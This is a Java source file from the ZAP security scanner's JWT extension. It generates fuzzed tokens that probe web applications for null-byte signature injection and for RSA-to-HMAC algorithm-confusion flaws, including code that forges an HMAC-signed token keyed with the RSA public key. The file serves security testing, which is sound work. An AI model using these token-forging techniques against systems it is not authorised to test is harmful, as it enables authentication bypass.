/*
 * Zed Attack Proxy (ZAP) and its related class files.
 *
 * ZAP is an HTTP/HTTPS proxy for assessing web application security.
 *
 * Copyright 2019 The ZAP Development Team
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package org.zaproxy.zap.extension.jwt.fuzzer;

import static org.zaproxy.zap.extension.jwt.JWTUtils.HMAC_256;
import static org.zaproxy.zap.extension.jwt.JWTUtils.JWT_ALGORITHM_KEY_HEADER;
import static org.zaproxy.zap.extension.jwt.JWTUtils.JWT_HEADER_WITH_ALGO_PLACEHOLDER;
import static org.zaproxy.zap.extension.jwt.JWTUtils.JWT_RSA_ALGORITHM_IDENTIFIER;
import static org.zaproxy.zap.extension.jwt.JWTUtils.JWT_TOKEN_PERIOD_CHARACTER;
import static org.zaproxy.zap.extension.jwt.JWTUtils.NULL_BYTE_CHARACTER;

import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.security.SignatureException;
import java.security.spec.InvalidKeySpecException;
import java.util.ArrayList;
import java.util.List;
import java.util.Objects;
import org.json.JSONException;
import org.json.JSONObject;
import org.parosproxy.paros.Constant;
import org.zaproxy.zap.extension.jwt.JWTExtensionValidationException;
import org.zaproxy.zap.extension.jwt.JWTTokenBean;
import org.zaproxy.zap.extension.jwt.JWTUtils;

/** @author preetkaran20@gmail.com KSASAN */
public class SignatureFuzzer implements JWTFuzzer {

    /**
     * Adds Null Byte to the signature to check if JWT is vulnerable to Null Byte injection
     *
     * @param jwtTokenBean
     * @return Null Byte fuzzed token
     * @throws UnsupportedEncodingException
     */
    private String getNullByteFuzzedToken(JWTTokenBean jwtTokenBean)
            throws UnsupportedEncodingException {
        JWTTokenBean cloneJWTTokenBean = new JWTTokenBean(jwtTokenBean);
        cloneJWTTokenBean.setSignature(
                cloneJWTTokenBean.getSignature() + NULL_BYTE_CHARACTER + Constant.getEyeCatcher());
        return cloneJWTTokenBean.getToken();
    }

    /**
     * Returns Fuzzed token by confusing algo keys.
     *
     * <p>Background about the attack:<br>
     * Say an application is using RSA to sign JWT now what will be the verification method {@code
     * verify(String jwtToken, byte[] key); }
     *
     * <p>Now if application is using RSA then for verification RSA public key will be used and in
     * case jwttoken is based on HMAC algorithm then verify method will think key as Secret key for
     * HMAC and will try to decrypt it and as public key is known to everyone so anyone can sign the
     * key with public key and HMAC will accept it.
     *
     * @param jwtTokenBean
     * @return
     * @throws JSONException
     * @throws IOException
     * @throws InvalidKeySpecException
     * @throws NoSuchAlgorithmException
     * @throws InvalidKeyException
     * @throws SignatureException
     * @throws JWTExtensionValidationException
     */
    private String getAlgoKeyConfusionFuzzedToken(JWTTokenBean jwtTokenBean)
            throws JWTExtensionValidationException, JSONException, NoSuchAlgorithmException,
                    InvalidKeySpecException, IOException {
        String fuzzedToken = null;
        JSONObject jwtHeaderJSON = new JSONObject(jwtTokenBean.getHeader());
        String algoType = jwtHeaderJSON.getString(JWT_ALGORITHM_KEY_HEADER);
        if (algoType.startsWith(JWT_RSA_ALGORITHM_IDENTIFIER)) {
            String jwtFuzzedHeader = String.format(JWT_HEADER_WITH_ALGO_PLACEHOLDER, HMAC_256);
            String base64EncodedFuzzedHeaderAndPayload =
                    JWTUtils.getBase64UrlSafeWithoutPaddingEncodedString(jwtFuzzedHeader)
                            + JWT_TOKEN_PERIOD_CHARACTER
                            + JWTUtils.getBase64UrlSafeWithoutPaddingEncodedString(
                                    jwtTokenBean.getPayload());
            byte[] base64EncodedFuzzedHeaderAndPayloadBytes =
                    JWTUtils.getBytes(base64EncodedFuzzedHeaderAndPayload);
            String base64EncodedFuzzedTokenSign =
                    JWTUtils.getBase64EncodedHMACSignedToken(
                            base64EncodedFuzzedHeaderAndPayloadBytes,
                            JWTUtils.getRSAPublicKey().getEncoded());
            fuzzedToken =
                    base64EncodedFuzzedHeaderAndPayload
                            + JWT_TOKEN_PERIOD_CHARACTER
                            + base64EncodedFuzzedTokenSign;
        }
        return fuzzedToken;
    }

    @Override
    public List<String> fuzzedTokens(JWTTokenBean jwtTokenBean) {
        List<String> fuzzedTokens = new ArrayList<>();
        try {
            String confusionFuzzedToken = getAlgoKeyConfusionFuzzedToken(jwtTokenBean);
            if (Objects.nonNull(confusionFuzzedToken)) {
                fuzzedTokens.add(confusionFuzzedToken);
            }
            fuzzedTokens.add(getNullByteFuzzedToken(jwtTokenBean));

        } catch (NoSuchAlgorithmException
                | InvalidKeySpecException
                | JSONException
                | IOException
                | JWTExtensionValidationException e) {
            // TODO Need to Handle Exception
            e.printStackTrace();
        }
        return fuzzedTokens;
    }
}
